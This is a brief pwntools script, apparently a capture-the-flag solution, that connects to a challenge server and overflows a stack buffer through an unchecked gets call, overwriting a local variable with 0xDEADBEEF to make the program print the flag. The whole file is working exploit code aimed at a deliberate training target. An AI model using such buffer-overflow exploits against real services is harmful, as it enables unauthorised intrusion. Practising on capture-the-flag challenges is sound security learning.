from pwn import *

p = remote("challs.xmas.htsp.ro", 2008)

# dumb call to gets. overwrite local variable on the stack, if set to DEADBEEF just prints flag lol
p.sendline(cyclic(cyclic_find("iaaajaaakaaalaaam")) + p64(0xDEADBEEF))

p.interactive()
